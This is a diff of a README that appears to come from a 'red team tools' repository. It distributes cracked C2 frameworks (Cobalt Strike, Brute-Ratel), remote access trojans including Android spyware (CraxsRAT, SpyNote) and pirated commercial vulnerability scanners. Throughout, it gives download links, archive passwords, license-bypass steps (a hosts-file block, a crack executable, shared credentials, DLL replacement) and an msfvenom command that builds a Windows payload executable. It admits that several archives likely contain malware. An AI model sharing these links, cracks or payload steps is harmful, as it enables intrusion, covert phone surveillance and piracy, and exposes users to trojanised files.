@@ -19,15 +19,16 @@ Sandboxing is useful when it comes to testing whether or not the tools contain m
 ##### Windows
 | Tool | Link |
 | :--- | ---: |
-| Cobalt Strike v4.9 (PW: `20231004_2218`) | [Removed, read why in the notes.] |
-| Brute-Ratel v1.2.2 (Scandinavian Defense) | [Download](https://pixeldrain.com/u/9bh8UK5N) |
+| Cobalt Strike v4.9.1 | [Download](https://gofile.io/d/U25hhJ) |
+| Brute-Ratel v1.4.5 (Blitzkrieg) | [Download](https://gofile.io/d/ouw6wM) |
+| SpecterInsightC2 | [Download](https://gofile.io/d/TAexo5) |
 | VenomRAT v6.0.1 | [Download](https://pixeldrain.com/u/xVXeWbWb) |
 
 ##### Android
 | Tool | Link |
 | :--- | ---: |
 | CraxsRAT v6? (⚠️ **READ NOTES** ⚠️) | [Download](https://pixeldrain.com/u/e3MdYXM7) |
-| ~~SpyNote v6.4~~ | SpyNote is outdated, wait for SpyNote X cracks to surface or use the tool above. |
+| SpyNote v7.3.1 (⚠️ **READ NOTES** ⚠️ | [Download](https://gofile.io/d/RjMdvJ) |
 
 <br><br>
 ### 🎭 Exploitation Toolkits/Software 🎭
@@ -43,52 +44,108 @@ Sandboxing is useful when it comes to testing whether or not the tools contain m
 ##### Windows
 | Tool | Link |
 | :--- | ---: |
-| Invicti Pro v24.1 | [Download](https://pixeldrain.com/u/DxDbY42C) |
+| Invicti Pro v25.2.1 | [Download](https://gofile.io/d/2ofjRt) |
 | Burp Suite PRO v2023.6.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/burpsuite_installer_windows.bat)) | [Download](https://pixeldrain.com/u/wWaQzSmC) |
-| Acunetix Scanner v24.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [Download](https://pixeldrain.com/u/g6YZc6y1) |
-| Xray Pro v1.9.10 | [Download](https://pixeldrain.com/u/JMYNm434) |
-| HCL AppScan Standard v10.4.0 | [Download](https://pixeldrain.com/u/3CWfWbHL) |
+| Acunetix v25.1.250204093 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [Download](https://gofile.io/d/f4Dmt5) |
+| Xray Pro v1.9.11 | [Download](https://gofile.io/d/5ZXNzu) |
+| HCL AppScan Standard v10.6.0.28408 | [Download](https://gofile.io/d/eEVTOJ) |
 
 ##### Linux
 | Tool | Link |
 | :--- | ---: |
-| Acunetix Scanner v24.1 | [Download](https://pixeldrain.com/u/29uGRi6d) |
-| Xray Pro v1.9.11 | [Download](https://pixeldrain.com/u/aFiuwBWs) |
+| Acunetix v25.1.250204093 | [Download](https://gofile.io/d/uLL9z9) |
+| Xray Pro v1.9.11 | [Download](https://gofile.io/d/5VlJJO) |
 
 <br><br>
 # 📝 Notes 📝
 ###### General
-Most of these tools are obtained from [CyberArsenal](https://cyberarsenal.org/) and [xss.is](https://xss.is/), credits for the cracks go to them.<br><br>If an archive asks for a password, try `pwn3rzs`, `Pwn3rzs`, `xss.is`, `XSS.IS` or `exploit.in`
+Most of these tools are obtained from [CyberArsenal](https://cyberarsenal.org/) and [xss.is](https://xss.is/), credits for the cracks go to them.
 
-###### Cobalt Strike
-⚠️ CyberArsenal no longer uses the ponies.cloud CDN ⚠️
-The repository is undergoing an update, the files will be re-uploaded to pixeldrain without a password.
+Everything is re-uploaded to gofile.io due to speed issues with the pwn3rzs CDN (presumably overloaded), including the removal of archive passwords (unless I suspect there is malware, in which case they're password protected)
+
 
 ###### Brute-Ratel
-I am not sure whether or not this version of Brute-Ratel works properly, it has not been tested at all, however from the few basic functions *I am assuming it works*. If it does not, someone let me know.
+This version is fully untested - no idea if it is broken or not.
 
-If Brute-Ratel fails to compile the badger.bin into a badger.exe you can use the following to manually compile it: `cat badger.bin | msfvenom -p - -f exe --platform win -a x64 -o badger.exe`
+The xmodlib file is cleared every start-up, including a license check being present every time you start Brute-Ratel.
 
-###### CraxsRat
-This version of CraxsRAT appears to be quite unstable when it comes to connections, if someone wants me to, I can attempt to find a newer version of this rat.
+Again, if it fails to compile the `badger.bin` payload into a executable, run the following: <br>
+`cat badger.bin | msfvenom -p - -f exe --platform win -a x64 -o badger.exe`
 
-###### Immunity CANVAS
-Immunity CANVAS contains the following: `D2 Exploitation Pack v2.55` & `White Phosphorus v1.28`.
 
-###### HCL AppScan
-Upon installing AppScan make sure to **replace the installed DLLs with the cracked ones**.
+###### CraxsRat V6(?)
+High possibility of malware, run **strictly** in a virtual environment. I am not responsible for any damages caused to your host machine if you run it outside a VM.
 
-###### JexBot v1.0
-1. Run add_hosts.bat as administrator, if you get an "Access Denied" error, open "C:\Windows\System32\drivers\etc\hosts" and add the following:
-```
-127.0.0.1 jex.tools
-127.0.0.1 www.jex.tools
-```
-2. Run "Jex_crack.exe" and then open "JEX BOT.exe"
-3. Put `mastercho` as the username and password and press login.
-Note: After logging into the JexBot, you may close "Jex_crack.exe", however you will have to re-open "Jex_crack.exe" every time you want to open the JexBot.
+Archive password: `suspicious`
 
-###### Craxs RAT v6?
-I am not sure if this is malware, as it is a remake of crax I've found on the xss.is forums going under "Anonymous V6", and it was also leaked according to OP.<br>Archive password: `suspicious`
 
-Run strictly in a VM environment.
+###### JexBot
+1. Run `add_hosts.bat` **as Administrator**
+2. Run `Jex_crack.exe` then `JEX BOT.exe`
+3. Put `mastercho` as the user/password combo
+
+Note: After logging into jexbot you can close `Jex_crack.exe`, however you will need to run `Jex_crack.exe` every time you want to run jexbot.
+
+
+###### Acunetix / Burp Suite
+The install scripts are untested for the latest versions. If required, open a issue and I'll update the scripts.
+
+
+###### SpyNote
+This tool was obtained from `xss.is`
+
+**HIGH CHANCE OF MALWARE**, triage analyses: <br>
+https://tria.ge/250310-xf1qravjv9/behavioral1 <br>
+https://tria.ge/250310-xf1qravjv9/behavioral2 <br>
+https://tria.ge/250310-xf1qravjv9/behavioral3
+
+NOTE: TCP requests -> `iis.nz`, attempts to identify if the tool is ran in a VM (presumably due to the Themida protection). <br>
+**Network requests shouldn't be made at all unless it's the payload contacting the C2** - however it could also be the pre-placed IP address being pinged to make sure it's existent, which I have not checked out.
+
+Archive password: `suspicious`
+
+
+###### Xray
+For Windows:<br>
+Open a command prompt (or powershell if you prefer that), run scans as follows:<br>
+`xray.exe ws --browser http://testphp.vulnweb.com --json-output testphp.json --html-output testphp.html`
+
+For Linux:<br>
+Open a terminal, run scans as follows:<br>
+`./xray ws --browser http://testphp.vulnweb.com --html-output testphp.html`
+
+Without rad/chrome:
+`./xray ws --basic http://testphp.vulnweb.com --html-output testphp.html`
+
+Missing Chrome "fix" (for using xray+rad): <br>
+`sudo apt update` <br>
+`wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb` <br>
+`sudo apt install ./google-chrome-stable_current_amd64.deb` <br>
+ Go to the launch script to insert `--no-sandbox` (e.g. `/opt/google/chrome/google-chrome`) <br>
+ Last line of the file should look like this: <br>
+`exec -a "$0" "$HERE/chrome" --no-sandbox "$@"`
+
+
+###### Invicti Professional
+1. Import the registry file so the knowledgebase properly renders<br>
+2. Run `NetSparker.exe`<br>
+3. Optional: Disable telemetry, system proxy, enable dark mode, etc
+
+
+###### HCL AppScan Standard
+**Make sure to replace the DLLs with the cracked ones**
+
+
+
+
+###### To be added:
+- MetaSploit Pro (Windows/Linux)
+- Nessus Pro (Windows/Linux)
+- IDA Pro 7.7
+- de4dot (pre-compiled)
+- AppSpider Full
+- HTTP Debugger Pro
+- Super XRay (A graphical user interface for XRay)
+- Glasswire Elite
+- An updated build of Burp Suite
+- Anything suggested in the issues tab (Nothing, for now)
